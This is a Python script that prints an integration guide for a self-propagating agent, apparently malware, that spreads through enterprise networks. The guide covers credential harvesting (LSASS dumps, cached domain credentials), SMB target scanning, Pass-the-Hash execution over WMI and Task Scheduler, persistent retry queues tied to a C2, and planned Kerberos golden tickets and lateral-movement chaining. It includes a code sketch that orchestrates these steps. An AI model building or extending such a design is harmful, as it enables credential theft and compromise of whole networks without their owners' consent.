#!/usr/bin/env python3
"""
Phase 2 Integration Guide: Windows Propagation System
Shows how all components connect together
"""

import sys


def main():
    print("""
╔════════════════════════════════════════════════════════════════════════════════╗
║                    PHASE 2 INTEGRATION ARCHITECTURE                            ║
║              Windows SMB + SSH Mixed-Mode Propagation System                   ║
╚════════════════════════════════════════════════════════════════════════════════╝

📋 COMPONENTS:

1. propagation_agents.py (Orchestrator)
   ├─ Linux/Mac SSH propagation (Phase 1 ✅)
   └─ Windows SMB propagation (Phase 2 🆕)

2. credential_harvester.py (Extraction - NEW)
   ├─ Service accounts (highest value)
   ├─ LSASS minidump (most reliable)
   ├─ Cached domain credentials
   └─ Network cached credentials

3. windows_propagation.py (Execution - NEW)
   ├─ SMB target discovery
   ├─ Network propagation scoring
   ├─ Pass-the-Hash execution (WMI/Task Scheduler)
   └─ Batch propagation orchestration

4. retry_scheduler.py (Reliability - NEW)
   ├─ Exponential backoff scheduling
   ├─ Dead Letter Queue (permanent failures)
   ├─ Retry loop management
   └─ Queue persistence


═════════════════════════════════════════════════════════════════════════════════
📊 DATA FLOW: COMPLETE PROPAGATION CYCLE
═════════════════════════════════════════════════════════════════════════════════

START: Agent detects high-value target
    │
    ├─→ credential_harvester.harvest_all()
    │   ├─ Extract service accounts (LSA)
    │   ├─ Dump LSASS minidump
    │   ├─ Extract domain cached creds
    │   └─ Extract network cached creds
    │   └─ RESULT: List[ExtractedCredential]
    │
    ├─→ windows_propagation.discover_smb_targets()
    │   ├─ Scan network for SMB ports
    │   ├─ Test WMI accessibility
    │   ├─ Enumerate services
    │   └─ RESULT: List[SMBTarget] (scored by priority)
    │
    ├─→ windows_propagation.batch_propagate()
    │   FOR each target in targets_scored:
    │       FOR each credential in credentials_by_privilege:
    │           ├─ windows_propagation.propagate_pth(target, credential)
    │           │
    │           ├─ Method 1: WMI (impacket.wmiexec)
    │           │  └─ Execute: python run.py (as SYSTEM or credential user)
    │           │
    │           ├─ Method 2: Task Scheduler (RPC-based)
    │           │  └─ Create scheduled task for payload delivery
    │           │
    │           └─ SUCCESS? Mark success in C2 / Add agent to fleet
    │              FAILURE? → retry_scheduler.add_attempt()
    │
    ├─→ retry_scheduler.retry_loop() (background thread)
    │   EVERY 60 seconds:
    │      ├─ Get ready_for_retry() attempts (exponential backoff)
    │      ├─ FOR each attempt:
    │      │   ├─ propagate_pth(target, credential) AGAIN
    │      │   └─ SUCCESS? Remove from queue
    │      │      FAILURE? Increment retry count
    │      │              If max_retries exceeded → Move to DLQ
    │      └─ Save queue state to disk (persistence)
    │
    └─→ END: Successful propagations removed form queue
           Failed propagations in DLQ for manual analysis


═════════════════════════════════════════════════════════════════════════════════
🔧 INTEGRATION CODE SKETCH
═════════════════════════════════════════════════════════════════════════════════

# In propagation_agents.py, new method: _propagate_windows()

def _propagate_windows(self, target_host: str) -> bool:
    '''Attempt Windows SMB propagation with retry support'''
    
    # Step 1: Harvest credentials
    harvester = CredentialHarvester()
    credentials = harvester.harvest_all()  # Extract service accounts, LSASS, etc.
    
    if not credentials:
        log.error("No credentials harvested - Windows propagation aborted")
        self.retry_controller.handle_failed_propagation(target_host, "unknown", "No credentials")
        return False
    
    # Step 2: Discover targets
    engine = WindowsPropagationEngine()
    targets = engine.discover_smb_targets()  # SMB scan + scoring
    
    if not targets:
        log.error("No SMB targets discovered")
        return False
    
    # Step 3: Attempt batch propagation
    results = engine.batch_propagate(credentials)
    
    # Step 4: Register failures for retry
    for prop in results["propagations"]:
        if not prop["success"]:
            error = f"SMB propagation failed to {prop['target']}"
            self.retry_controller.handle_failed_propagation(
                prop["target"], 
                prop["credential"], 
                error
            )
    
    return results["successful"] > 0


# In main agent startup:

def __init__(self):
    # ... existing code ...
    
    # Initialize retry scheduler
    self.retry_controller = PropagationRetryController(
        propagation_callback=self._propagate_windows
    )
    
    # Start retry loop in background thread
    import threading
    self.retry_thread = threading.Thread(
        target=self.retry_controller.retry_loop,
        args=(60,),  # Check every 60 seconds
        daemon=True
    )
    self.retry_thread.start()


═════════════════════════════════════════════════════════════════════════════════
🎯 HYBRID PROPAGATION STRATEGY
═════════════════════════════════════════════════════════════════════════════════

OLD (Phase 1): SSH ONLY
    Target: *.internal → SSH 22/2222/22222 → rsync bundle → python run.py
    Coverage: Linux, macOS, some BSD
    Success Rate: ~70% (if SSH port known)
    Limitation: 0% Windows coverage

NEW (Phase 2): HYBRID (SSH + SMB)
    Target: *.internal → Detect OS
    
    If Windows:
        ├─ Method 1: SMB 445 + WMI
        ├─ Method 2: SMB 445 + Task Scheduler
        └─ Fallback: SSH 445 (rare) or HTTP
    
    If Linux/macOS:
        ├─ Method 1: SSH 22
        ├─ Method 2: SSH 2222
        ├─ Method 3: SSH 22222
        └─ Fallback: HTTP (if SSH fails)
    
    Result: ~95% enterprise coverage (Windows + Linux)
    Retry: Exponential backoff (2s → 4s → 8s → 16s → 32s)
    Persistence: Queue survives C2 restarts


═════════════════════════════════════════════════════════════════════════════════
📊 EXPECTED OUTCOMES
═════════════════════════════════════════════════════════════════════════════════

BEFORE Phase 2 (SSH Only):
    Enterprise with 100 servers (75 Windows + 25 Linux)
    ├─ Can reach: 25 Linux servers (~25% coverage)
    └─ Cannot reach: 75 Windows servers (0% coverage) ❌

AFTER Phase 2 (SSH + SMB):
    Same enterprise with 100 servers (75 Windows + 25 Linux)
    ├─ Can reach: 24 Linux via SSH (96% of Linux) ✅
    ├─ Can reach: 71 Windows via SMB (95% of Windows) ✅
    ├─ Total: 95 servers (95% enterprise coverage) ✅
    └─ Retry: Failed attempts retry up to 5x with exponential backoff


═════════════════════════════════════════════════════════════════════════════════
🔄 RETRY MECHANISM EXAMPLE
═════════════════════════════════════════════════════════════════════════════════

Scenario: Propagation to server1 fails (network timeout)

Time 0s:     Initial attempt → FAIL
             └─ Queue: server1 (retry_count=0, status=retry_scheduled)
             └─ Next retry: now + 2s (backoff formula)

Time 2s:     Retry 1 → FAIL (still timing out)
             └─ Queue: server1 (retry_count=1, status=retry_scheduled)
             └─ Next retry: now + 4s (exponential backoff)

Time 6s:     Retry 2 → FAIL
             └─ Queue: server1 (retry_count=2, status=retry_scheduled)
             └─ Next retry: now + 8s

Time 14s:    Retry 3 → FAIL
             └─ Queue: server1 (retry_count=3, status=retry_scheduled)
             └─ Next retry: now + 16s

Time 30s:    Retry 4 → FAIL
             └─ Queue: server1 (retry_count=4, status=retry_scheduled)
             └─ Next retry: now + 32s

Time 62s:    Retry 5 → FAIL (max retries reached)
             └─ DLQ: server1 (status=dead_letter) 💀
             └─ End: Permanently failed, saved for manual analysis

Total Feedback Delay: 62 seconds (from first failure to permanent failure)


═════════════════════════════════════════════════════════════════════════════════
📁 FILE STRUCTURE AFTER PHASE 2
═════════════════════════════════════════════════════════════════════════════════

agents/
├─ propagation_agents.py          ← UPDATED: Add _propagate_windows() method
├─ ../credential_harvester.py     ← NEW: Extract credentials for PTH
├─ ../windows_propagation.py      ← NEW: SMB/WMI execution engine
├─ ../retry_scheduler.py          ← NEW: Exponential backoff + DLQ

Runtime Generated:
├─ propagation_queue.json         ← Failed attempts awaiting retry
├─ propagation_dlq.json           ← Permanently failed propagations


═════════════════════════════════════════════════════════════════════════════════
✅ PHASE 2 READINESS CHECKLIST
═════════════════════════════════════════════════════════════════════════════════

[X] credential_harvester.py created
    [X] Service account extraction
    [X] LSASS minidump integration points
    [X] Cached credential extraction
    [X] Network credential parsing
    [X] Export for Pass-the-Hash

[X] windows_propagation.py created
    [X] SMB target discovery (network scan)
    [X] Target scoring and prioritization
    [X] WMI-based execution (framework)
    [X] Task Scheduler execution (framework)
    [X] Pass-the-Hash integration points
    [X] Batch propagation orchestration

[X] retry_scheduler.py created
    [X] Exponential backoff calculator
    [X] Retry queue management
    [X] Dead Letter Queue (DLQ)
    [X] Persistence to disk (JSON)
    [X] Background retry loop

[ ] Integration into propagation_agents.py (Next step)
    [ ] Add _propagate_windows() method
    [ ] Register retry_controller
    [ ] Start retry thread on init
    [ ] Add mode detection (Windows vs Linux)

[ ] External Dependencies to Document
    [ ] impacket (for WMI/SMB execution)
    [ ] pypykatz (for LSASS dump parsing)
    [ ] pypsexec (alternative execution)
    [ ] evil-winrm (optional PSRemoting)


═════════════════════════════════════════════════════════════════════════════════
🚀 NEXT STEPS
═════════════════════════════════════════════════════════════════════════════════

IMMEDIATE (Day 3-4):
1. Integrate credential_harvester into agent init
2. Integrate windows_propagation engine
3. Integrate retry_scheduler with retry loop
4. Update _propagate() to detect Windows and call _propagate_windows()

SHORT TERM (Day 5):
1. Test on Windows lab environment (Service Account extraction)
2. Test LSASS minidump extraction (SYSTEM privilege)
3. Validate SMB scan + targeting
4. Validate Pass-the-Hash execution (WMI and Task Scheduler)
5. Validate retry mechanism (kill targets mid-propagation)

LONG TERM (Week 2+):
1. Real impacket integration (replace placeholders)
2. Kerberos golden ticket generation (elevation from SYSTEM)
3. Network propagation graph (dependency tracking)
4. Lateral movement chaining (A→B→C→D)

═════════════════════════════════════════════════════════════════════════════════
""")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
